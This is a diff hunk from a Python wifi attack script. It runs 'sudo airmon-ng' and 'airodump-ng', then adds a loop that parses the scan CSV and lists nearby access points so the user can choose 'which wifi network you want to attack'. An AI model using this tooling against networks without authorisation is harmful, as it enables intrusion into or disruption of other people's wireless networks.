@@ -106,3 +106,49 @@ put_in_monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", user_choice]
 discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", user_choice + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
+# this loop shows the wireless access points. uses a try-except block and you quit the loop by pressing CTRL-C
+try:
+    while True:
+        # clears the screen first
+        subprocess.call("clear", shell=True)
+        for file_name in os.listdir():
+                # should only have one csv file. all previous csv files from the folder are backed-up every time this runs
+                
+                # this list contains the field names for the csv entries
+                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
+                
+                if ".csv" in file_name:
+                    with open(file_name) as csv_h:
+                        # this will run multiple times and the cursor needs to reset to the beginning
+                        csv_h.seek(0)
+                        
+                        # take the csv_h contents and apply the dictionary with the fieldnames from above 
+                        # This creates a list of dictionaries with the keys from the fieldnames
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for row in csv_reader:
+                            
+                            # We want to exclude the row with BSSID.
+                            if row["BSSID"] == "BSSID":
+                                pass
+                            
+                            # don't care about the client data
+                            elif row["BSSID"] == "Station MAC":
+                                break
+                            
+                            # every field where there's an ESSID will be added to the list.
+                            elif check_for_essid(row["ESSID"], active_wifi_networks):
+                                active_wifi_networks.append(row)
+
+
+
+        print("Scanning... Press Ctrl+C to select which wifi network you want to attack.\n")
+        print("No |\tBSSID              |\tChannel|\tESSID                         |")
+        print("___|\t___________________|\t_______|\t______________________________|")
+        
+        for index, item in enumerate(active_wifi_networks):
+
+            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+            
+        # the script sleeps for 1 second before loading the updated list
+        time.sleep(1)
+
